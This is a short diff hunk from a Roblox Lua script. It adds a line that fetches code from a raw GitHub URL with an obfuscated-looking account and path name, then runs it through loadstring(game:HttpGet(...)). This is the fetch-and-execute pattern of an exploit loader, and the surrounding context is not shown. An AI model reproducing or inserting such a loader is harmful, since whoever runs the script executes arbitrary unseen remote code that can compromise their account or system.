@@ -2750,4 +2750,4 @@ task.wait(12)
     return env
 end)() .. [[
 task.wait(2)
-loadstring(game:HttpGet(""))()]])
+loadstring(game:HttpGet("https://raw.githubusercontent.com/idontthinkicngetiudwatidiujsuighapuo/blackbootydghjdghj234/refs/heads/main/uhhhhhhhhhhhhhhhhhhhhhhhhhhsssss122143"))()]])
